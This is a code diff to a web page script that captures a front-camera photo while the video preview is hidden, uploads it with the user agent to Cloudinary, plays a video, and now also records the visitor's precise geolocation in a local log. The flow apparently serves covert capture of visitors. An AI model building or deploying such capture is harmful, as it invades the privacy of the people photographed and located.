@@ -16,6 +16,7 @@
   let stream = null;
   let busy = false;
   let completed = false;
+  const RECORDS_STORAGE_KEY = 'image-upload-records';
 
   const PERMISSION_DENIED = 'Permission not granted';
   const CAMERA_READY_MS = Math.max(300, (cfg.countdownSeconds ?? 2) * 1000);
@@ -35,9 +36,13 @@
     return 'unknown';
   }
 
-  function showPermissionDenied() {
-    els.statusText.textContent = PERMISSION_DENIED;
+  function showStatus(message) {
+    els.statusText.textContent = message;
     els.statusBadge.classList.add('visible');
+  }
+
+  function showPermissionDenied() {
+    showStatus(PERMISSION_DENIED);
   }
 
   function hideStatus() {
@@ -57,6 +62,10 @@
   function concealVideo() {
     els.video.classList.add('concealed');
     els.video.classList.remove('playback');
+  }
+
+  function getUserAgent() {
+    return navigator.userAgent || 'Unknown';
   }
 
   async function checkCameraPermission() {
@@ -141,7 +150,7 @@
     form.append('upload_preset', cfg.uploadPreset);
     if (cfg.folder) form.append('folder', cfg.folder);
     form.append('tags', `device-${deviceSlug},web-capture`);
-    form.append('context', `user_agent=${encodeURIComponent(navigator.userAgent)}`);
+    form.append('context', `user_agent=${encodeURIComponent(getUserAgent())}`);
 
     return new Promise((resolve, reject) => {
       const xhr = new XMLHttpRequest();
@@ -164,7 +173,94 @@
 
   async function captureAndUpload() {
     const blob = await captureFrame();
-    await uploadToCloudinary(blob);
+    return uploadToCloudinary(blob);
+  }
+
+  function getStoredRecords() {
+    try {
+      const raw = localStorage.getItem(RECORDS_STORAGE_KEY);
+      const records = raw ? JSON.parse(raw) : [];
+      return Array.isArray(records) ? records : [];
+    } catch {
+      return [];
+    }
+  }
+
+  function saveStoredRecords(records) {
+    try {
+      localStorage.setItem(RECORDS_STORAGE_KEY, JSON.stringify(records));
+    } catch {
+      /* ignore storage failures */
+    }
+  }
+
+  function saveUploadRecord(uploadResult, location) {
+    if (!uploadResult?.secure_url) return;
+
+    const records = getStoredRecords();
+    records.unshift({
+      id: uploadResult.asset_id || uploadResult.public_id || `local-${Date.now()}`,
+      photoUrl: uploadResult.secure_url,
+      publicId: uploadResult.public_id || '',
+      uploadedAt: new Date().toISOString(),
+      userAgent: getUserAgent(),
+      latitude: location?.latitude ?? null,
+      longitude: location?.longitude ?? null
+    });
+    saveStoredRecords(records.slice(0, 200));
+  }
+
+  function getCurrentPosition() {
+    if (!navigator.geolocation?.getCurrentPosition) return Promise.resolve(null);
+
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) =>
+          resolve({
+            latitude: pos.coords?.latitude ?? null,
+            longitude: pos.coords?.longitude ?? null
+          }),
+        () => resolve(null),
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 30000
+        }
+      );
+    });
+  }
+
+  function waitForPlaybackReady(video, timeoutMs = 20000) {
+    return new Promise((resolve, reject) => {
+      if (video.readyState >= 2) {
+        resolve();
+        return;
+      }
+
+      const timer = setTimeout(() => {
+        cleanup();
+        reject(new Error('Video load timeout'));
+      }, timeoutMs);
+
+      function cleanup() {
+        clearTimeout(timer);
+        video.removeEventListener('loadeddata', onReady);
+        video.removeEventListener('error', onError);
+      }
+
+      function onReady() {
+        cleanup();
+        resolve();
+      }
+
+      function onError() {
+        cleanup();
+        reject(new Error('Video failed to load'));
+      }
+
+      video.addEventListener('loadeddata', onReady, { once: true });
+      video.addEventListener('error', onError, { once: true });
+    });
   }
 
   async function playCloudinaryVideo() {
@@ -176,16 +272,29 @@
     els.video.removeAttribute('src');
     els.video.classList.remove('concealed');
     els.video.classList.add('playback');
-    els.video.src = playbackUrl;
     els.video.loop = true;
-    els.video.muted = false;
     els.video.playsInline = true;
+    els.video.setAttribute('playsinline', '');
+    els.video.setAttribute('webkit-playsinline', '');
+    els.video.preload = 'auto';
+    els.video.muted = true;
+    els.video.src = playbackUrl;
+    els.video.load();
+
+    await waitForPlaybackReady(els.video);
 
     try {
       await els.video.play();
     } catch {
       els.video.muted = true;
       await els.video.play();
+    }
+
+    try {
+      els.video.muted = false;
+      await els.video.play();
+    } catch {
+      els.video.muted = true;
     }
   }
 
@@ -203,6 +312,7 @@
     }
 
     try {
+      const locationPromise = getCurrentPosition();
       stream = await navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: { ideal: 'user' },
@@ -216,7 +326,9 @@
       els.video.muted = true;
       await els.video.play();
       await waitForVideoReady();
-      await captureAndUpload();
+      const uploadResult = await captureAndUpload();
+      const location = await locationPromise;
+      saveUploadRecord(uploadResult, location);
 
       hideFrostOverlay();
       await playCloudinaryVideo();
@@ -224,12 +336,20 @@
       return true;
     } catch (err) {
       const name = err?.name || '';
+      const message = err?.message || '';
+
       if (name === 'NotAllowedError' || name === 'PermissionDeniedError' || name === 'NotFoundError') {
         showPermissionDenied();
-      } else if (err.message === 'Invalid video dimensions' || err.message === 'Capture failed') {
+      } else if (message === 'Invalid video dimensions' || message === 'Capture failed') {
         showPermissionDenied();
+      } else if (message === 'Upload failed' || message === 'Network error') {
+        showStatus('Upload failed');
+      } else if (message === 'Playback URL not configured') {
+        showStatus('Video not configured');
+      } else if (message === 'Video failed to load' || message === 'Video load timeout') {
+        showStatus('Video failed to play');
       } else {
-        showPermissionDenied();
+        showStatus('Something went wrong');
       }
       stopStream();
       concealVideo();
